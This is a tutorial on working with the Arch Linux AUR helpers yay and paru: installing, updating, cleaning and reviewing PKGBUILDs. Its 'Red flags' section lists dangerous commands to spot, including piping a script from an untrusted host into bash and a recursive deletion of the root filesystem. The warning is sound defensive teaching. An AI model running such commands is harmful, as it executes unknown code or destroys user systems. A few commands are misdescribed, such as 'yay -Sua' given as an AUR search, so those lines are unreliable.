## Workflow with AUR Helpers


### Overview

AUR helpers streamline the process of building and installing packages from the Arch User Repository while maintaining integration with pacman for official packages. Understanding proper workflow ensures efficient package management and system security.

### Initial Setup

#### Installing Your First AUR Helper

Since AUR helpers are themselves in the AUR, you must install the first one manually:

**Installing yay (recommended for beginners):**
```bash
# Install base-devel if not already installed
sudo pacman -S --needed base-devel git

# Clone yay repository
git clone https://aur.archlinux.org/yay.git
cd yay

# Review PKGBUILD (important!)
cat PKGBUILD

# Build and install
makepkg -si

# Verify installation
yay --version
```

**Installing paru (alternative):**
```bash
sudo pacman -S --needed base-devel git
git clone https://aur.archlinux.org/paru.git
cd paru
cat PKGBUILD
makepkg -si
paru --version
```

#### Configuration

**yay configuration location:**
```
~/.config/yay/config.json
```

**Generate default config:**
```
yay -Y --gendb
yay -Y --save
```

**Common configuration options:**
```
yay --save --answerclean All --answerdiff None --removemake
```

Options:
- `--answerclean All` - Auto-clean build files
- `--answerdiff None` - Don't show diffs by default
- `--removemake` - Remove make dependencies after build

**paru configuration location:**
```
/etc/paru.conf
~/.config/paru/paru.conf
```

**Example paru.conf:**
```ini
[options]
BottomUp
SudoLoop
NewsOnUpgrade
```

### Basic Workflow Operations

#### Searching for Packages

**Search repos and AUR:**
```
yay -Ss package-name
paru -Ss package-name
```

**Output shows:**
```
extra/package-name 1.0-1
    Official repository package

aur/package-name-git r123.abc123-1 (+50 0.42)
    AUR package description
```

**AUR notation explained:**
- `(+50 0.42)` = 50 votes, 0.42% popularity
- Higher votes/popularity generally indicate trusted packages

**Search AUR only:**
```
yay -Sua package-name
```

#### Installing Packages

**Install from repos or AUR (auto-detect):**
```
yay -S package-name
paru -S package-name
```

**Process:**
1. Helper checks official repos first
2. If not found, searches AUR
3. Downloads PKGBUILD
4. Shows PKGBUILD for review
5. Prompts for confirmation
6. Resolves dependencies
7. Builds package
8. Installs with pacman

**Install multiple packages:**
```
yay -S package1 package2 package3
```

**Skip PKGBUILD review (not recommended):**
```
yay -S package-name --noconfirm
```

#### Package Information

**View package details:**
```
yay -Si package-name
paru -Si package-name
```

Shows:
- Repository/AUR location
- Version
- Dependencies
- Description
- Votes and popularity (AUR)

**View installed package info:**
```
yay -Qi package-name
```

### System Updates

#### Full System Update

**Update official repos + AUR packages:**
```
yay -Syu
paru -Syu
```

**Process:**
1. Syncs official repository databases
2. Checks for AUR package updates
3. Shows all available updates
4. Prompts for confirmation
5. Downloads and builds AUR packages
6. Updates official packages with pacman
7. Installs updated AUR packages

#### Update AUR Packages Only

```
yay -Sua
paru -Sua
```

Updates only AUR packages, skipping official repos.

#### Update Development Packages

Development packages (`-git`, `-svn`, `-hg`, etc.) don't have version numbers, so helpers can't detect updates automatically.

**Update with development packages:**
```
yay -Syu --devel
paru -Syu --devel
```

This rebuilds all development packages to get latest upstream changes.

#### Check for Updates Without Installing

```
yay -Qu
paru -Qu
```

Lists available updates without installing them.

### Package Removal

#### Remove Package

**AUR helpers delegate to pacman:**
```
yay -R package-name
paru -R package-name
```

Same as `sudo pacman -R package-name`.

**Remove with dependencies and configs:**
```
yay -Rns package-name
paru -Rns package-name
```

Recommended for clean removal.

**Remove orphaned packages:**
```
yay -Yc
paru -c
```

Or using pacman directly:
```
sudo pacman -Rns $(pacman -Qdtq)
```

### PKGBUILD Review Workflow

#### Why Review PKGBUILDs

**Security reasons:**
- PKGBUILDs can contain arbitrary commands
- Malicious code could compromise your system
- AUR has no official security review

**Quality reasons:**
- Check package is building correctly
- Verify source URLs are legitimate
- Understand what the package does

#### Reviewing with yay

**During installation:**
```
yay -S package-name
```

yay prompts:
```
:: Proceed with review? [Y/n]: y
```

Opens PKGBUILD in your `$EDITOR`.

**Manual review:**
```
yay -G package-name
```

Downloads PKGBUILD to current directory without building.

**Review without installing:**
```
cd ~/.cache/yay/package-name
cat PKGBUILD
```

#### Reviewing with paru

**During installation:**
```
paru -S package-name
```

paru shows diff and prompts for review.

**Batch review mode:**
```
paru -S package1 package2 package3
```

Reviews all PKGBUILDs before building any.

#### What to Look For

**Legitimate sources:**
```bash
source=("https://github.com/project/archive/$pkgver.tar.gz")
```

Check URL is official project repository.

**Red flags:**
```bash
# Dangerous patterns:
curl http://untrusted.com/script.sh | bash
wget -O - http://site.com/install | sh
rm -rf / --no-preserve-root
```

**Acceptable commands:**
```bash
# Normal build steps:
./configure --prefix=/usr
make
make DESTDIR="$pkgdir" install
```

**Check dependencies:**
```bash
depends=('python' 'gtk3')
makedepends=('rust' 'cargo')
```

Ensure dependencies are reasonable.

### Advanced Operations

#### Clean Build Cache

**yay:**
```
yay -Sc        # Remove uninstalled packages
yay -Scc       # Remove all cached packages
```

**paru:**
```
paru -Sc       # Clean repo cache
paru -Scc      # Clean repo + AUR cache
```

**Cache locations:**
```
~/.cache/yay/
~/.cache/paru/
```

#### Rebuild Packages

After system library updates, rebuild AUR packages:

**Rebuild all foreign packages:**
```
yay -S $(pacman -Qmq) --rebuild
paru -S $(pacman -Qmq) --rebuild
```

**Rebuild specific package:**
```
yay -S package-name --rebuild
```

#### Development Package Updates

**List development packages:**
```
pacman -Qm | grep -E -- '-(git|svn|hg|bzr|cvs|darcs)$'
```

**Update all development packages:**
```
yay -Syu --devel
paru -Syu --devel
```

#### Working with Package Bases

**Download package build files:**
```
yay -G package-name
```

Creates directory with PKGBUILD and related files.

**Edit PKGBUILD and rebuild:**
```
yay -G package-name
cd package-name
nano PKGBUILD
makepkg -si
```

**Build without installing:**
```
makepkg -s
```

Package file created in current directory.

### Troubleshooting Workflow

#### Build Failures

**Check build output:**
```
yay -S package-name 2>&1 | tee build.log
```

Saves output to file for analysis.

**Clean and retry:**
```
yay -Sc               # Clean cache
yay -S package-name --rebuild
```

**Check AUR comments:**
Visit `https://aur.archlinux.org/packages/package-name` and read comments for known issues and fixes.

#### Dependency Conflicts

**Install dependencies manually:**
```
yay -S dependency-name
yay -S package-name
```

**Skip dependency checks (dangerous):**
```
makepkg -si --nodeps
```

Only use if you understand the dependency tree.

#### PGP Key Issues

**Import missing keys:**
```
gpg --recv-keys KEY_ID
```

**From AUR helper:**
```
yay -S package-name
# When prompted, yay can import keys automatically
```

#### Version Conflicts

**Force downgrade:**
```
yay -U /path/to/old-package.pkg.tar.zst
```

**Hold package version:**
```
# Add to /etc/pacman.conf
IgnorePkg = package-name
```

### Best Practices Workflow

#### Daily/Weekly Workflow

**1. Check Arch news:**
```
# Visit https://archlinux.org/news/
# Or with paru:
paru -Pww
```

**2. Update system:**
```
yay -Syu
```

**3. Review PKGBUILDs:**
Always review when prompted.

**4. Clean orphans:**
```
yay -Yc
# or
paru -c
```

**5. Check for issues:**
```
systemctl --failed
journalctl -p err -b
```

#### Monthly Workflow

**1. Full development update:**
```
yay -Syu --devel
```

**2. Clean caches:**
```
yay -Sc
sudo paccache -rk3
```

**3. Rebuild problematic packages:**
```
yay -S problematic-package --rebuild
```

**4. Review installed AUR packages:**
```
pacman -Qm
```

Remove packages no longer needed.

#### Before Major Changes

**1. Create backup/snapshot:**
```
sudo timeshift --create
```

**2. Read package comments:**
Check AUR pages for recent issues.

**3. Update keyring first:**
```
sudo pacman -Sy archlinux-keyring
```

**4. Proceed with update:**
```
yay -Syu
```

### Automation and Scripts

#### Update Script with Safety Checks

```bash
#!/bin/bash
# Safe AUR helper update script

echo "=== Arch Linux Update Script ==="

# 1. Check Arch news
echo "Check Arch news: https://archlinux.org/news/"
read -p "Continue with update? (y/n): " CONT
[ "$CONT" != "y" ] && exit 0

# 2. Create snapshot if available
if command -v timeshift &>/dev/null; then
    echo "Creating snapshot..."
    sudo timeshift --create --comments "Pre-update $(date +%Y%m%d)"
fi

# 3. Update keyring
echo "Updating keyring..."
sudo pacman -Sy archlinux-keyring

# 4. System update
echo "Starting system update..."
yay -Syu

# 5. Clean orphans
echo "Removing orphans..."
yay -Yc --noconfirm

# 6. Check for issues
echo "Checking for failed services..."
systemctl --failed

echo "=== Update complete ==="
```

#### Weekly Maintenance Script

```bash
#!/bin/bash
# Weekly maintenance with AUR helper

# Update all packages including development
yay -Syu --devel --noconfirm

# Clean package caches
yay -Sc --noconfirm
sudo paccache -rk2

# Clean orphans
yay -Yc --noconfirm

# Clean journal
sudo journalctl --vacuum-time=2weeks

# Report
echo "=== Maintenance Complete ==="
echo "System size: $(df -h / | tail -1 | awk '{print $3}')"
echo "Cache size: $(du -sh ~/.cache/yay/ | cut -f1)"
```

### Comparing yay and paru Workflows

#### yay Workflow

**Strengths:**
- Simple pacman-like syntax
- Good default behavior
- Easy to learn
- Widely used and documented

**Typical yay session:**
```
yay -Syu                    # Update everything
yay -Ss package             # Search
yay -S package              # Install
yay -G package              # Download PKGBUILD
yay -Yc                     # Clean orphans
```

#### paru Workflow

**Strengths:**
- News checking built-in
- Batch PKGBUILD review
- Clean chroot builds available
- More advanced features

**Typical paru session:**
```
paru -Syu                   # Update with news check
paru -Ss package            # Search
paru -S package             # Install with review
paru -G package             # Clone repo
paru -c                     # Clean orphans
```

### Best Practices Summary

**Always review PKGBUILDs:** Never skip security review of AUR packages.

**Update regularly:** Frequent small updates are safer than large infrequent ones.

**Read AUR comments:** Community often reports issues before you encounter them.

**Keep one helper:** Use either yay or paru, not both simultaneously.

**Clean regularly:** Remove build caches and orphaned packages.

**Rebuild after library updates:** Especially for packages using shared libraries.

**Check news before updating:** Manual interventions are announced on Arch news.

**Use development updates sparingly:** Only when you need latest changes.

**Backup before major changes:** System snapshots save time if issues arise.

**Report issues:** Help the community by commenting on AUR packages.

AUR helpers significantly streamline working with community packages while maintaining the security and quality advantages of manual review and pacman integration.

